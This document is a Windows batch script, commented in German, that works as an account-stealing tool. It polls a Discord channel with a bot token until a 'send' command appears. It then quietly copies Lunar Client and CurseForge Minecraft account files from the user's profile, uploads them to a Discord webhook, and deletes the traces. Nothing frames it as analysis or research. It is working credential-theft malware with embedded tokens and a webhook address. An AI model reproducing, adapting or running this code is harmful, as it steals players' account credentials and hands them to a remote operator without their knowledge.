@echo off
setlocal EnableDelayedExpansion

set TOKEN=-AZjZEXDtPPYQo4FsNfGo06Y
set CHANNEL_ID=1461422511022674017

:loop
:: UTC-Sekunden synchronisieren
for /f "tokens=1-4 delims=:." %%a in ('wmic path win32_utctime get /format:list ^| findstr "="') do (
    set /a "sec=%%d"
)

:: Auf nächste 10er-Sekunde warten (0,10,20,30,40,50)
set /a "wait=(10 - (sec %% 10)) %% 10"
if !wait! neq 0 (
    timeout /t !wait! >nul
)

:: Originaler Listener bleibt UNVERÄNDERT
curl -s -H "Authorization: Bot MTQ2ODk1NDY2OTU4OTIwNTE2Ng.GtcCKR.x3ihdK9N9Zqcex%TOKEN%" https://discord.com/api/v10/channels/%CHANNEL_ID%/messages?limit=1 > settings.json

type settings.json | findstr /i "\"content\":\"send\"" >nul
if not errorlevel 1 (
    goto continue
)

:: 10 Sekunden warten für nächsten Takt
timeout /t 10 >nul
goto loop

:continue
setlocal

set "WEBHOOK_URL=https://discord.com/api/webhooks/1466804187710099720/92f98uyLb5PNSbL9g53NPC914LmjV409aNKV_ORvPUFNTNQqZaX8UcmxauZs0qIuU4Ne"

:: Lunar Client Teil
set "JSON_PATH=%USERPROFILE%\.lunarclient\settings\game\accounts.json"
set "TXT_FILE=%TEMP%\accounts_%random%.txt"
if exist "%JSON_PATH%" (
    where curl >nul 2>&1
    if not errorlevel 1 (
        copy "%JSON_PATH%" "%TXT_FILE%" >nul 2>&1
        if exist "%TXT_FILE%" (
            curl -X POST -F "content=# Lunar Client" -F "file=@%TXT_FILE%" "%WEBHOOK_URL%" >nul 2>&1
            del "%TXT_FILE%" >nul 2>&1
        )
    )
)

:: CurseForge Teil
set "JSON_PATH=%USERPROFILE%\curseforge\minecraft\Install\launcher_accounts.json"
set "TXT_FILE=%TEMP%\accounts_%random%.txt"
if exist "%JSON_PATH%" (
    where curl >nul 2>&1
    if not errorlevel 1 (
        copy "%JSON_PATH%" "%TXT_FILE%" >nul 2>&1
        if exist "%TXT_FILE%" (
            curl -X POST -F "content=# CurseForge Launcher" -F "file=@%TXT_FILE%" "%WEBHOOK_URL%" >nul 2>&1
            del "%TXT_FILE%" >nul 2>&1
        )
    )
)

goto loop
